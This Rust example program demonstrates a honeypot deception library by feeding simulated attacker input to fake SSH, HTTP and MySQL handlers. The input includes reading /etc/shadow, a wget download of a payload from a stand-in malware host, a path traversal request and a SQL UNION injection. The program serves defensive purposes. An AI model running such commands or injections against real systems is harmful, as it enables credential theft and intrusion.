//! Advanced Honeypot Interactions Example
//!
//! Zeigt realistische SSH, HTTP und MySQL Interaktionen

use honeytrap_deception::{
    CommandParser, FakeFilesystem, HttpInteractionHandler, HttpMethod, HttpRequest,
    MysqlInteractionHandler, ResponseGenerator, ResponseStrategy, SshInteractionHandler,
};
use std::collections::HashMap;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt::init();

    println!("🍯 Advanced Honeypot Interactions Demo\n");

    // SSH Interaction Demo
    println!("═══════════════════════════════════════");
    println!("🔐 SSH Honeypot Interaction");
    println!("═══════════════════════════════════════\n");

    let mut ssh_handler = SshInteractionHandler::new("ssh-session-001".to_string());

    println!("📤 Banner: {}", ssh_handler.send_banner().await);
    println!("🔑 Authenticating...");
    ssh_handler.authenticate("root", "password123", ).await;
    
    println!("\n💻 Simulating attacker commands:\n");
    
    let commands = vec![
        "whoami",
        "pwd",
        "ls -la",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "wget http://malware.com/payload.sh",
        "chmod +x payload.sh",
        "uname -a",
        "history",
    ];

    for cmd in commands {
        println!("{} {}", ssh_handler.get_prompt(), cmd);
        let output = ssh_handler.execute_command(cmd).await;
        print!("{}", output);
    }

    println!("\n📊 SSH Session Statistics:");
    println!("{}", ssh_handler.get_stats());

    // HTTP Interaction Demo
    println!("\n═══════════════════════════════════════");
    println!("🌐 HTTP Honeypot Interaction");
    println!("═══════════════════════════════════════\n");

    let mut http_handler = HttpInteractionHandler::new("http-session-001".to_string());

    // Homepage request
    let req1 = HttpRequest {
        method: HttpMethod::GET,
        path: "/".to_string(),
        headers: HashMap::new(),
        body: None,
    };
    println!("📥 GET /");
    let resp1 = http_handler.handle_request(req1).await;
    println!("📤 Response: {} {}\n", resp1.status, resp1.status_text);

    // Login page
    let req2 = HttpRequest {
        method: HttpMethod::GET,
        path: "/login".to_string(),
        headers: HashMap::new(),
        body: None,
    };
    println!("📥 GET /login");
    let resp2 = http_handler.handle_request(req2).await;
    println!("📤 Response: {} {}\n", resp2.status, resp2.status_text);

    // Login attempt
    let req3 = HttpRequest {
        method: HttpMethod::POST,
        path: "/login".to_string(),
        headers: HashMap::new(),
        body: Some("username=admin&password=admin123".to_string()),
    };
    println!("📥 POST /login (admin:admin123)");
    let resp3 = http_handler.handle_request(req3).await;
    println!("📤 Response: {} {}\n", resp3.status, resp3.status_text);

    // Directory traversal attempt
    let req4 = HttpRequest {
        method: HttpMethod::GET,
        path: "/../../etc/passwd".to_string(),
        headers: HashMap::new(),
        body: None,
    };
    println!("📥 GET /../../etc/passwd (Directory Traversal)");
    let resp4 = http_handler.handle_request(req4).await;
    println!("📤 Response: {} {}\n", resp4.status, resp4.status_text);

    let http_stats = http_handler.get_stats();
    println!("📊 HTTP Session Statistics:");
    println!("   Requests: {}", http_stats.request_count);
    println!("   Login attempts: {}", http_stats.login_attempts);
    println!("   Captured credentials: {:?}\n", http_stats.captured_credentials);

    // MySQL Interaction Demo
    println!("═══════════════════════════════════════");
    println!("🗄️  MySQL Honeypot Interaction");
    println!("═══════════════════════════════════════\n");

    let mut mysql_handler = MysqlInteractionHandler::new("mysql-session-001".to_string());

    println!("📤 Sending handshake...");
    mysql_handler.send_handshake().await;
    
    println!("🔑 Authenticating...");
    mysql_handler.authenticate("root", "toor", Some("mysql")).await;

    println!("\n💾 Simulating SQL queries:\n");

    let queries = vec![
        "SHOW DATABASES",
        "USE corporate_db",
        "SHOW TABLES",
        "SELECT * FROM users",
        "SELECT * FROM users UNION SELECT NULL,NULL,NULL--",
        "SELECT SLEEP(5)",
    ];

    for query in queries {
        println!("mysql> {}", query);
        let response = mysql_handler.handle_query(query).await;
        match response {
            honeytrap_deception::MysqlResponse::ResultSet { columns, rows } => {
                println!("   Columns: {:?}", columns);
                println!("   Rows: {} returned\n", rows.len());
            }
            honeytrap_deception::MysqlResponse::Ok { affected_rows } => {
                println!("   OK ({} rows affected)\n", affected_rows);
            }
            honeytrap_deception::MysqlResponse::Error { code, message } => {
                println!("   ERROR {}: {}\n", code, message);
            }
        }
    }

    let mysql_stats = mysql_handler.get_stats();
    println!("📊 MySQL Session Statistics:");
    println!("   Queries: {}", mysql_stats.query_count);
    println!("   Authenticated: {}", mysql_stats.authenticated);
    println!("   User: {:?}", mysql_stats.username);
    println!("   Database: {:?}\n", mysql_stats.database);

    // Response Strategy Demo
    println!("═══════════════════════════════════════");
    println!("🎯 Response Strategy Demonstration");
    println!("═══════════════════════════════════════\n");

    let strategies = vec![
        ResponseStrategy::Minimal,
        ResponseStrategy::Standard,
        ResponseStrategy::Deep,
        ResponseStrategy::Adaptive,
    ];

    for strategy in strategies {
        let gen = ResponseGenerator::new(strategy);
        let delay = gen.calculate_delay(0.5);
        println!("Strategy: {:?}", strategy);
        println!("   Delay: {:?}", delay);
        println!("   Detailed errors: {}", gen.should_provide_detailed_error());
        println!("   Simulate vulns: {}\n", gen.should_simulate_vulnerability());
    }

    // Fake Filesystem Demo
    println!("═══════════════════════════════════════");
    println!("📁 Fake Filesystem Demonstration");
    println!("═══════════════════════════════════════\n");

    let mut fs = FakeFilesystem::new();
    
    println!("📂 Current directory: {}", fs.current_dir());
    println!("\n📋 Listing /home/admin:");
    if let Ok(entries) = fs.list_dir(Some("/home/admin")) {
        for entry in entries {
            println!("   {} {}", entry.permissions, entry.name);
        }
    }

    println!("\n📄 Reading .bashrc:");
    if let Ok(content) = fs.read_file("/home/admin/.bashrc") {
        println!("{}", content);
    }

    println!("🔐 Attempting to read /etc/shadow:");
    match fs.read_file("/etc/shadow") {
        Ok(content) => println!("   Success: {}", content),
        Err(e) => println!("   {}", e),
    }

    println!("\n✅ Advanced Honeypot Interactions Demo completed!");

    Ok(())
}
